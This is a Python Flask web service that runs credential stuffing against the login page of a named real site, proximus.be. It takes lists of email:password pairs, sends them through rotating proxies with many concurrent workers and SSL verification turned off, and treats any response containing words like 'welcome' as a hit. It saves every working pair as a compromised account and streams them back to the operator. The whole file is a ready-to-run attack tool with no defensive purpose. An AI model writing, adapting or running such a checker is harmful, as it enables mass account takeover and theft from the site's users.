from flask import Flask, request, jsonify, Response
import asyncio
import aiohttp
import json
import time
import re
from queue import Queue
import uuid
import os
import threading

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024

SITE_CONFIG = dict(
    name="proximus.be",
    base_url="BASE_proximus.be",
    login_endpoint="/member/login"
)

active_jobs = dict()
job_results = dict()

class CheckerEngine:
    def __init__(self, job_id, threads, timeout, proxy_list=None, webhook_url=None):
        self.job_id = job_id
        self.threads = threads
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.proxy_list = proxy_list
        self.webhook_url = webhook_url
        self.stats = dict(hits=0, fails=0, errors=0, checked=0, total=0)
        self.results = []
        self.results_queue = Queue()
        self.is_running = True

    async def check_single(self, session, email, pwd, proxy):
        timeout = self.timeout
        try:
            csrf = ""
            data = dict([("email", email), ("password", pwd), ("login[_token]", csrf)])
            
            async with session.post("https://nl.forum.proximus.be/member/login", data=data, proxy=proxy, timeout=timeout, allow_redirects=True) as r:
                try:
                    rj = await r.json()
                    url = str(r.url)
                except:
                    rj = await r.text()
                    url = str(r.url)
                
                response_str = (json.dumps(rj) if isinstance(rj, dict) else str(rj)).lower()
                
                fail_words = ["invalid", "incorrect", "wrong", "failed", "error", "denied"]
                success_words = ["dashboard", "welcome", "success", "logged", "account", "profile"]
                
                if any(w in response_str for w in fail_words):
                    return "FAIL", "Invalid"
                elif any(w in response_str for w in success_words):
                    return "HIT", url
                else:
                    return "UNKNOWN", "Check"
        except Exception as e:
            return "ERROR", str(e)[:25]

    async def worker(self, queue):
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            while self.is_running:
                try:
                    item = await asyncio.wait_for(queue.get(), timeout=1.0)
                except asyncio.TimeoutError:
                    continue
                if item is None:
                    break
                idx, email, pwd = item
                
                proxy = None
                if self.proxy_list:
                    proxy = self.proxy_list[idx % len(self.proxy_list)]
                    if not proxy.startswith("http"):
                        proxy = "http://" + proxy
                
                status, msg = await self.check_single(session, email, pwd, proxy)
                
                self.stats["checked"] += 1
                if status == "HIT":
                    self.stats["hits"] += 1
                    self.results.append(email + ":" + pwd)
                elif status == "FAIL":
                    self.stats["fails"] += 1
                else:
                    self.stats["errors"] += 1
                
                self.results_queue.put(dict(index=idx, email=email, status=status, message=msg, stats=self.stats.copy()))
                queue.task_done()

    async def run(self, combos):
        self.stats["total"] = len(combos)
        q = asyncio.Queue()
        for c in combos:
            await q.put(c)
        for _ in range(self.threads):
            await q.put(None)
        await asyncio.gather(*[asyncio.create_task(self.worker(q)) for _ in range(self.threads)])

def run_thread(job_id, combos, threads, proxies, webhook):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    checker = CheckerEngine(job_id, threads, 30, proxies, webhook)
    active_jobs[job_id] = checker
    try:
        loop.run_until_complete(checker.run(combos))
    finally:
        job_results[job_id] = dict(status="done", stats=checker.stats, hits=checker.results)
        if job_id in active_jobs:
            del active_jobs[job_id]
        loop.close()

@app.route("/")
def home():
    return jsonify(dict(status="online", site="proximus.be", active=len(active_jobs)))

@app.route("/health")
def health():
    return jsonify(dict(status="ok"))

@app.route("/check", methods=["POST", "GET"])
def check():
    if request.method == "GET":
        return jsonify(dict(info="POST combos to check"))
    data = request.json
    if not data or "combos" not in data:
        return jsonify(dict(error="No combos")), 400
    
    combos = []
    for idx, c in enumerate(data["combos"], data.get("start_line", 1)):
        if ":" in c:
            parts = c.split(":", 1)
            combos.append((idx, parts[0].strip(), parts[1].strip()))
    
    job_id = str(uuid.uuid4())
    t = threading.Thread(target=run_thread, args=(job_id, combos, data.get("threads", 10), data.get("proxies"), data.get("webhook_url")))
    t.daemon = True
    t.start()
    return jsonify(dict(job_id=job_id, status="started", combos=len(combos)))

@app.route("/results/<job_id>")
def results(job_id):
    def generate():
        while True:
            if job_id in active_jobs:
                c = active_jobs[job_id]
                while not c.results_queue.empty():
                    yield "data: " + json.dumps(c.results_queue.get_nowait()) + "\n\n"
                time.sleep(0.1)
            elif job_id in job_results:
                yield "data: " + json.dumps(job_results[job_id]) + "\n\n"
                break
            else:
                break
    return Response(generate(), mimetype="text/event-stream")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, threaded=True)
